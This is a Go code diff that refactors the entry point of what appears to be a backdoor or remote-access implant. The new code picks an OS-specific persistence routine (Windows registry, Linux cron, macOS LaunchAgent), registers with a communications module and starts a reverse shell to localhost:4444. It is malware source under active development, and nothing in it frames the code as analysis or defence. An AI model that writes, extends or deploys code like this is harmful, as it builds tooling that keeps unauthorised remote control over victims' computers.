@@ -7,16 +7,21 @@ import (
 	"runtime"
 )
 
-func main() {
+var persistenceFuncs = map[string]func() error{
+	"windows": persistence.AddToRegistry,
+	"linux":   persistence.AddToCron,
+	"darwin":  persistence.AddToLaunchAgent,
+}
 
+func main() {
 	communications.Register()
 
-	if runtime.GOOS == "windows" {
-		persistence.AddToRegistry()
-	} else if runtime.GOOS == "linux" {
-		persistence.AddToCron()
-	} else if runtime.GOOS == "darwin" {
-		persistence.AddToLaunchAgent()
+	if f, ok := persistenceFuncs[runtime.GOOS]; ok {
+		err := f()
+
+		if err != nil {
+			// handle the failure
+		}
 	}
 
 	reverse.StartReverseShell("localhost:4444")
